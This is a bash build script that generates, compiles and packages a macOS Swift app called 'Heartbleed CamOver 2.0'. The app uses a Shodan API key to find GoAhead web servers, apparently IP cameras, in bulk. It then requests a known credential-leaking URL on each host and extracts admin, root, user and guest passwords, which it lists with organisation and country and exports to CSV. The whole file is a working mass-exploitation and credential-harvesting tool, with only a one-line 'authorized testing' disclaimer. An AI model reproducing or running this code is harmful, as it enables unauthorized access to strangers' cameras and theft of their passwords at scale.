#!/bin/bash

cd "$(dirname "$0")"

APP_EXEC="HeartbleedCamOver2"
DISPLAY_NAME="Heartbleed camover 2.0 gui"
APP_DIR="$APP_EXEC.app"
DMG_FILE="$APP_EXEC.dmg"
SWIFT_FILE="$APP_EXEC.swift"

echo "Checking Xcode Command Line Tools..."

if ! command -v swiftc >/dev/null 2>&1; then
    echo "swiftc not found. Installing Xcode Command Line Tools..."
    xcode-select --install
    echo "After installation completes, run this script again."
    exit 1
fi

rm -rf "$APP_DIR" "$DMG_FILE" "$SWIFT_FILE"

mkdir -p "$APP_DIR/Contents/MacOS"
mkdir -p "$APP_DIR/Contents/Resources"

cat > "$APP_DIR/Contents/Info.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>$APP_EXEC</string>
    <key>CFBundleIdentifier</key>
    <string>local.heartbleed.camover2</string>
    <key>CFBundleName</key>
    <string>$DISPLAY_NAME</string>
    <key>CFBundleDisplayName</key>
    <string>$DISPLAY_NAME</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>2.0</string>
    <key>NSPrincipalClass</key>
    <string>NSApplication</string>
    <key>NSHighResolutionCapable</key>
    <true/>
    <key>NSAppTransportSecurity</key>
    <dict>
        <key>NSAllowsArbitraryLoads</key>
        <true/>
    </dict>
</dict>
</plist>
EOF

cat > "$SWIFT_FILE" <<'SWIFT_EOF'
import Cocoa
import UniformTypeIdentifiers

struct Row { let address: String; var result: String; let org: String; let country: String }
struct VulnResult { let address: String; let creds: [String]; let org: String; let country: String }

class AppDelegate: NSObject, NSApplicationDelegate, NSTableViewDataSource, NSTableViewDelegate {
    var window: NSWindow!
    var secureField: NSSecureTextField!
    var plainField: NSTextField!
    var showButton: NSButton!
    var threadsField: NSTextField!
    var maxField: NSTextField!
    var startButton: NSButton!
    var stopButton: NSButton!
    var exportButton: NSButton!
    var tableView: NSTableView!
    var logView: NSTextView!
    var statusLabel: NSTextField!
    var progress: NSProgressIndicator!
    var targetsLabel: NSTextField!
    var scannedLabel: NSTextField!
    var vulnLabel: NSTextField!
    var safeLabel: NSTextField!
    var speedLabel: NSTextField!
    var speedTimer: Timer?
    var rows: [Row] = []
    var vulnData: [VulnResult] = []
    var shouldStop = false
    var isScanning = false
    var targets = 0
    var scanned = 0
    var vuln = 0
    var safe = 0
    var lastScanned = 0
    let defaultQuery = "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"
    let bg = NSColor(calibratedRed: 0.04, green: 0.04, blue: 0.04, alpha: 1.0)
    let panel = NSColor(calibratedRed: 0.10, green: 0.10, blue: 0.10, alpha: 1.0)
    let accent = NSColor(calibratedRed: 1.0, green: 0.2, blue: 0.2, alpha: 1.0)
    let green = NSColor(calibratedRed: 0.0, green: 0.8, blue: 0.27, alpha: 1.0)
    let muted = NSColor(calibratedWhite: 0.65, alpha: 1.0)

    func applicationDidFinishLaunching(_ notification: Notification) {
        let frame = NSRect(x: 0, y: 0, width: 1100, height: 750)
        window = NSWindow(contentRect: frame, styleMask: [.titled, .closable, .miniaturizable, .resizable], backing: .buffered, defer: false)
        window.center()
        window.title = "Heartbleed CamOver 2.0"
        window.backgroundColor = bg
        window.appearance = NSAppearance(named: .darkAqua)
        guard let content = window.contentView else { return }
        content.wantsLayer = true
        content.layer?.backgroundColor = bg.cgColor
        buildHeader(content); buildInputs(content); buildButtons(content)
        buildStats(content); buildProgress(content); buildTable(content)
        buildLog(content); buildStatus(content)
        window.makeKeyAndOrderFront(nil)
        NSApp.activate(ignoringOtherApps: true)
        log("[*] Ready. Use only for authorized testing.", color: muted)
    }

    func applicationShouldTerminateAfterLastWindowClosed(_ sender: NSApplication) -> Bool { return true }

    func buildHeader(_ content: NSView) {
        let title = makeLabel("HEARTBLEED CAMOVER 2.0", NSRect(x: 20, y: 690, width: 1060, height: 32), 24, accent, bold: true)
        content.addSubview(title)
    }

    func buildInputs(_ content: NSView) {
        let apiLabel = makeLabel("Shodan API Key:", NSRect(x: 20, y: 655, width: 120, height: 16), 12, .white)
        content.addSubview(apiLabel)
        secureField = NSSecureTextField(frame: NSRect(x: 140, y: 645, width: 400, height: 30))
        secureField.placeholderString = "Enter API Key"
        styleField(secureField)
        content.addSubview(secureField)
        plainField = NSTextField(frame: NSRect(x: 140, y: 645, width: 400, height: 30))
        plainField.placeholderString = "Enter API Key"
        styleField(plainField)
        plainField.isHidden = true
        content.addSubview(plainField)
        showButton = makeButton("Show", NSRect(x: 550, y: 646, width: 60, height: 28), NSColor(calibratedWhite: 0.2, alpha: 1.0))
        showButton.target = self; showButton.action = #selector(toggleShow)
        content.addSubview(showButton)
        
        let threadsLabel = makeLabel("Threads:", NSRect(x: 630, y: 655, width: 60, height: 16), 12, .white)
        content.addSubview(threadsLabel)
        threadsField = makeField(NSRect(x: 690, y: 645, width: 60, height: 30), "100")
        threadsField.stringValue = "100"; threadsField.alignment = .center
        content.addSubview(threadsField)
        
        let maxLabel = makeLabel("Max (0=Unlim):", NSRect(x: 770, y: 655, width: 100, height: 16), 12, .white)
        content.addSubview(maxLabel)
        maxField = makeField(NSRect(x: 870, y: 645, width: 70, height: 30), "100")
        maxField.stringValue = "100"; maxField.alignment = .center
        content.addSubview(maxField)
    }

    func buildButtons(_ content: NSView) {
        startButton = makeButton("START SCAN", NSRect(x: 20, y: 600, width: 120, height: 30), NSColor(calibratedRed: 0.8, green: 0.0, blue: 0.0, alpha: 1.0))
        startButton.target = self; startButton.action = #selector(startScan)
        content.addSubview(startButton)
        stopButton = makeButton("STOP", NSRect(x: 150, y: 600, width: 80, height: 30), NSColor(calibratedWhite: 0.25, alpha: 1.0))
        stopButton.target = self; stopButton.action = #selector(stopScan); stopButton.isEnabled = false
        content.addSubview(stopButton)
        exportButton = makeButton("EXPORT CSV", NSRect(x: 240, y: 600, width: 100, height: 30), NSColor(calibratedWhite: 0.15, alpha: 1.0))
        exportButton.target = self; exportButton.action = #selector(exportCSV)
        content.addSubview(exportButton)
    }

    func buildStats(_ content: NSView) {
        targetsLabel = makeLabel("FOUND: 0", NSRect(x: 20, y: 565, width: 200, height: 18), 14, accent, bold: true)
        content.addSubview(targetsLabel)
        scannedLabel = makeLabel("SCANNED: 0", NSRect(x: 250, y: 565, width: 200, height: 18), 14, .lightGray, bold: true)
        content.addSubview(scannedLabel)
        vulnLabel = makeLabel("VULNERABLE: 0", NSRect(x: 480, y: 565, width: 200, height: 18), 14, green, bold: true)
        content.addSubview(vulnLabel)
        safeLabel = makeLabel("SAFE: 0", NSRect(x: 710, y: 565, width: 200, height: 18), 14, .gray, bold: true)
        content.addSubview(safeLabel)
        speedLabel = makeLabel("SPEED: 0/s", NSRect(x: 900, y: 565, width: 180, height: 18), 14, .orange, bold: true)
        content.addSubview(speedLabel)
    }

    func buildProgress(_ content: NSView) {
        progress = NSProgressIndicator(frame: NSRect(x: 20, y: 545, width: 1060, height: 10))
        progress.style = .bar; progress.isIndeterminate = true
        content.addSubview(progress)
    }

    func buildTable(_ content: NSView) {
        let tableScroll = NSScrollView(frame: NSRect(x: 20, y: 200, width: 1060, height: 330))
        tableScroll.hasVerticalScroller = true; tableScroll.autohidesScrollers = true
        tableScroll.borderType = .bezelBorder; tableScroll.backgroundColor = .black
        tableView = NSTableView(frame: tableScroll.bounds)
        tableView.autoresizingMask = [.width, .height]; tableView.backgroundColor = .clear
        tableView.rowHeight = 25; tableView.intercellSpacing = NSSize(width: 0, height: 2)
        tableView.dataSource = self; tableView.delegate = self
        let columns: [(String, String, CGFloat)] = [("address", "ADDRESS", 160), ("creds", "CREDENTIALS", 400), ("org", "ORG", 250), ("country", "CC", 60)]
        for column in columns {
            let c = NSTableColumn(identifier: NSUserInterfaceItemIdentifier(column.0))
            c.title = column.1; c.width = column.2; c.minWidth = 50
            tableView.addTableColumn(c)
        }
        if let header = tableView.headerView { header.wantsLayer = true; header.layer?.backgroundColor = panel.cgColor }
        tableScroll.documentView = tableView; content.addSubview(tableScroll)
    }

    func buildLog(_ content: NSView) {
        let logScroll = NSScrollView(frame: NSRect(x: 20, y: 40, width: 1060, height: 150))
        logScroll.hasVerticalScroller = true; logScroll.borderType = .bezelBorder; logScroll.backgroundColor = .black
        logView = NSTextView(frame: logScroll.bounds)
        logView.autoresizingMask = [.width]; logView.isEditable = false
        logView.backgroundColor = NSColor(calibratedRed: 0.02, green: 0.02, blue: 0.02, alpha: 1.0)
        logView.textColor = .lightGray; logView.font = NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)
        logView.textContainer?.containerSize = NSSize(width: logScroll.contentSize.width, height: CGFloat.greatestFiniteMagnitude)
        logView.textContainer?.widthTracksTextView = true
        logScroll.documentView = logView; content.addSubview(logScroll)
    }

    func buildStatus(_ content: NSView) {
        statusLabel = makeLabel("Ready", NSRect(x: 20, y: 15, width: 1060, height: 16), 11, muted)
        content.addSubview(statusLabel)
    }

    func makeLabel(_ text: String, _ frame: NSRect, _ size: CGFloat, _ color: NSColor, bold: Bool = false) -> NSTextField {
        let label = NSTextField(labelWithString: text); label.frame = frame
        label.font = NSFont.systemFont(ofSize: size, weight: bold ? .bold : .regular)
        label.textColor = color; label.drawsBackground = false; return label
    }

    func makeField(_ frame: NSRect, _ placeholder: String) -> NSTextField {
        let field = NSTextField(frame: frame); field.placeholderString = placeholder; styleField(field); return field
    }

    func styleField(_ field: NSTextField) {
        field.drawsBackground = false; field.isBordered = false; field.wantsLayer = true
        field.layer?.backgroundColor = NSColor(calibratedWhite: 0.13, alpha: 1.0).cgColor
        field.layer?.cornerRadius = 6; field.textColor = .white
        field.font = NSFont.systemFont(ofSize: 13); field.focusRingType = .none
    }

    func makeButton(_ title: String, _ frame: NSRect, _ color: NSColor) -> NSButton {
        let button = NSButton(frame: frame); button.title = title; button.isBordered = false
        button.wantsLayer = true; button.layer?.backgroundColor = color.cgColor; button.layer?.cornerRadius = 6
        button.contentTintColor = .white; button.font = NSFont.systemFont(ofSize: 12, weight: .bold); return button
    }

    @objc func toggleShow() {
        if secureField.isHidden { secureField.stringValue = plainField.stringValue; secureField.isHidden = false; plainField.isHidden = true; showButton.title = "Show" }
        else { plainField.stringValue = secureField.stringValue; plainField.isHidden = false; secureField.isHidden = true; showButton.title = "Hide" }
    }

    @objc func startScan() {
        guard !isScanning else { return }
        let key = secureField.isHidden ? plainField.stringValue : secureField.stringValue
        let trimmedKey = key.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmedKey.isEmpty else { log("[!] ERROR: Enter Shodan API key.", color: .red); return }
        let threadsRaw = Int(threadsField.stringValue) ?? 100; let threads = max(1, min(300, threadsRaw))
        let maxRaw = Int(maxField.stringValue) ?? 0; let maxTargets = max(0, maxRaw)
        threadsField.stringValue = String(threads); maxField.stringValue = String(maxTargets)
        clearUI(); isScanning = true; shouldStop = false
        startButton.isEnabled = false; stopButton.isEnabled = true; exportButton.isEnabled = false
        statusLabel.stringValue = "Scanning..."; progress.startAnimation(nil); startSpeedTimer()
        log("[*] Authorizing Shodan by given API key...", color: muted)
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            let semaphore = DispatchSemaphore(value: threads); let group = DispatchGroup()
            self.fetchAndScan(key: trimmedKey, maxTargets: maxTargets, semaphore: semaphore, group: group)
            group.notify(queue: .main) { self.finishScan() }
        }
    }

    @objc func stopScan() { shouldStop = true; stopButton.isEnabled = false; statusLabel.stringValue = "Stopping..."; log("[!] Stop requested.", color: .orange) }

    @objc func exportCSV() {
        guard !vulnData.isEmpty else { log("[*] No vulnerable results to export.", color: .orange); return }
        let panel = NSSavePanel()
        if #available(macOS 11.0, *) { panel.allowedContentTypes = [UTType.commaSeparatedText] } else { panel.allowedFileTypes = ["csv"] }
        panel.nameFieldStringValue = "camover_vulns.csv"
        if panel.runModal() == .OK, let url = panel.url {
            var lines: [String] = ["address,creds,org,cc"]
            for item in vulnData {
                let row = [item.address, item.creds.joined(separator: "; "), item.org, item.country].map(csvEscape).joined(separator: ",")
                lines.append(row)
            }
            do { try lines.joined(separator: "\n").write(to: url, atomically: true, encoding: .utf8); log("[+] Exported to CSV.", color: green) }
            catch { log("[!] Export failed.", color: .red) }
        }
    }

    func csvEscape(_ value: String) -> String {
        if value.contains(",") || value.contains("\"") || value.contains("\n") { return "\"" + value.replacingOccurrences(of: "\"", with: "\"\"") + "\"" }
        return value
    }

    func clearUI() {
        rows.removeAll(); vulnData.removeAll(); tableView.reloadData()
        if let storage = logView.textStorage { storage.deleteCharacters(in: NSMakeRange(0, storage.length)) }
        targets = 0; scanned = 0; vuln = 0; safe = 0; lastScanned = 0; updateStats()
    }

    func updateStats() {
        targetsLabel.stringValue = "FOUND: \(targets)"; scannedLabel.stringValue = "SCANNED: \(scanned)"
        vulnLabel.stringValue = "VULNERABLE: \(vuln)"; safeLabel.stringValue = "SAFE: \(safe)"
    }

    func updateTargets(_ value: Int) { DispatchQueue.main.async { self.targets = value; self.targetsLabel.stringValue = "FOUND: \(value)" } }

    func startSpeedTimer() {
        speedTimer?.invalidate(); lastScanned = 0
        speedTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
            guard let self = self else { return }
            let delta = self.scanned - self.lastScanned; let speed = Double(delta) / 0.5
            self.speedLabel.stringValue = String(format: "SPEED: %.1f/s", speed); self.lastScanned = self.scanned
        }
    }

    func finishScan() {
        isScanning = false; speedTimer?.invalidate(); speedTimer = nil; speedLabel.stringValue = "SPEED: 0/s"
        startButton.isEnabled = true; stopButton.isEnabled = false; exportButton.isEnabled = true
        progress.stopAnimation(nil); statusLabel.stringValue = "Done"; log("[*] Scan finished.", color: muted)
    }

    func fetchAndScan(key: String, maxTargets: Int, semaphore: DispatchSemaphore, group: DispatchGroup) {
        var submitted = 0; var page = 1
        while !shouldStop {
            if maxTargets > 0 && submitted >= maxTargets { break }
            guard let matches = searchShodan(key: key, page: page) else { log("[!] Shodan API error or limit reached.", color: .orange); break }
            if matches.isEmpty { log("[*] No more matches.", color: .orange); break }
            for match in matches {
                if shouldStop { break }
                if maxTargets > 0 && submitted >= maxTargets { break }
                guard let ip = match["ip_str"] as? String, let port = match["port"] as? Int else { continue }
                let address = "\(ip):\(port)"; let org = (match["org"] as? String) ?? ""
                let location = match["location"] as? [String: Any]; let country = (location?["country_code"] as? String) ?? ""
                semaphore.wait()
                if shouldStop { semaphore.signal(); break }
                group.enter(); submitted += 1
                if submitted % 20 == 0 { updateTargets(submitted) }
                DispatchQueue.global(qos: .userInitiated).async { [weak self] in
                    guard let self = self else { semaphore.signal(); group.leave(); return }
                    let creds = self.exploit(address)
                    DispatchQueue.main.async {
                        self.scanned += 1
                        if creds.isEmpty { self.safe += 1 }
                        else {
                            self.vuln += 1
                            self.addVuln(address: address, creds: creds, org: org, country: country)
                            self.log("[+] (\(address)) - \(creds.joined(separator: ", "))", color: self.green)
                        }
                        self.updateStats()
                    }
                    semaphore.signal(); group.leave()
                }
            }
            if matches.count < 100 { break }
            page += 1; usleep(200000)
        }
        updateTargets(submitted)
        if !shouldStop { log("[+] Fetched \(submitted) targets. Exploiting...", color: green) }
    }

    func searchShodan(key: String, page: Int) -> [[String: Any]]? {
        var components = URLComponents(string: "https://api.shodan.io/shodan/host/search")
        components?.queryItems = [URLQueryItem(name: "key", value: key), URLQueryItem(name: "query", value: defaultQuery), URLQueryItem(name: "page", value: String(page))]
        guard let url = components?.url else { return nil }
        var request = URLRequest(url: url); request.timeoutInterval = 15
        var result: [[String: Any]]?; let semaphore = DispatchSemaphore(value: 0)
        URLSession.shared.dataTask(with: request) { data, response, error in
            if error != nil { self.log("[!] Network error.", color: .red) }
            else if let data = data {
                if let obj = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any] {
                    if let matches = obj["matches"] as? [[String: Any]] { result = matches }
                    else if let apiError = obj["error"] as? String { self.log("[!] Shodan API: \(apiError)", color: .orange); result = nil }
                }
            }
            semaphore.signal()
        }.resume()
        semaphore.wait(); return result
    }

    func exploit(_ address: String) -> [String] {
        guard let url = URL(string: "http://\(address)/system.ini?loginuse&loginpas") else { return [] }
        var request = URLRequest(url: url); request.timeoutInterval = 3.0
        var creds: [String] = []; let semaphore = DispatchSemaphore(value: 0)
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let http = response as? HTTPURLResponse, http.statusCode == 200, let data = data {
                let text = String(data: data, encoding: .utf8) ?? String(decoding: data, as: UTF8.self)
                let strings = self.extractStrings(text); var seen = Set<String>()
                let targets = ["admin", "root", "user", "guest"]
                for t in targets {
                    if let idx = strings.firstIndex(of: t) {
                        if idx + 1 < strings.count {
                            let pwd = strings[idx + 1]; let pair = "\(t):\(pwd)"
                            if !seen.contains(pair) { seen.insert(pair); creds.append(pair) }
                        }
                    }
                }
            }
            semaphore.signal()
        }.resume()
        semaphore.wait(); return creds
    }

    func extractStrings(_ text: String) -> [String] {
        let pattern = "[ -~]{4,}"; guard let regex = try? NSRegularExpression(pattern: pattern) else { return [] }
        let range = NSRange(text.startIndex..<text.endIndex, in: text); let matches = regex.matches(in: text, range: range)
        var result: [String] = []; result.reserveCapacity(matches.count)
        for match in matches { if let range = Range(match.range, in: text) { result.append(String(text[range])) } }
        return result
    }

    func addVuln(address: String, creds: [String], org: String, country: String) {
        let result = creds.joined(separator: "; ")
        rows.insert(Row(address: address, result: result, org: org, country: country), at: 0)
        vulnData.insert(VulnResult(address: address, creds: creds, org: org, country: country), at: 0)
        tableView.insertRows(at: IndexSet(integer: 0), withAnimation: .slideDown)
        if rows.count > 2000 { let overflow = rows.count - 2000; rows.removeLast(overflow); vulnData.removeLast(overflow); tableView.reloadData() }
    }

    func numberOfRows(in tableView: NSTableView) -> Int { return rows.count }

    func tableView(_ tableView: NSTableView, rowViewForRow row: Int) -> NSTableRowView? {
        let rowView = NSTableRowView(); rowView.backgroundColor = green; return rowView
    }

    func tableView(_ tableView: NSTableView, viewFor tableColumn: NSTableColumn?, row: Int) -> NSView? {
        guard let column = tableColumn else { return nil }
        let item = rows[row]; let id = column.identifier.rawValue; let cellId = NSUserInterfaceItemIdentifier("cell_\(id)")
        let cell: NSTextField
        if let existing = tableView.makeView(withIdentifier: cellId, owner: nil) as? NSTextField { cell = existing }
        else {
            cell = NSTextField(labelWithString: ""); cell.identifier = cellId; cell.drawsBackground = false
            cell.isBordered = false; cell.lineBreakMode = .byTruncatingTail; cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .bold)
        }
        switch id {
        case "address": cell.stringValue = item.address; cell.alignment = .left
        case "creds": cell.stringValue = item.result; cell.alignment = .left
        case "org": cell.stringValue = item.org; cell.alignment = .left
        case "country": cell.stringValue = item.country; cell.alignment = .center
        default: cell.stringValue = ""
        }
        cell.textColor = .black; return cell
    }

    func log(_ text: String, color: NSColor) {
        DispatchQueue.main.async {
            let attrs: [NSAttributedString.Key: Any] = [.foregroundColor: color, .font: NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)]
            self.logView.textStorage?.append(NSAttributedString(string: text + "\n", attributes: attrs))
            if let storage = self.logView.textStorage, storage.length > 200000 { storage.deleteCharacters(in: NSMakeRange(0, storage.length - 150000)) }
            let location = self.logView.textStorage?.length ?? 0; self.logView.scrollRangeToVisible(NSRange(location: location, length: 0))
        }
    }
}

let app = NSApplication.shared; let delegate = AppDelegate()
app.delegate = delegate; app.setActivationPolicy(.regular); app.run()
SWIFT_EOF

echo "Compiling Swift app..."
swiftc -O -o "$APP_DIR/Contents/MacOS/$APP_EXEC" "$SWIFT_FILE" -framework Cocoa

if [ $? -ne 0 ]; then
    echo "Compilation failed."
    exit 1
fi

codesign --force --sign - "$APP_DIR" || true

echo "Creating DMG..."
hdiutil create "$DMG_FILE" -volname "$DISPLAY_NAME" -srcfolder "$APP_DIR" -ov -format UDZO

echo "Done: $DMG_FILE"
open .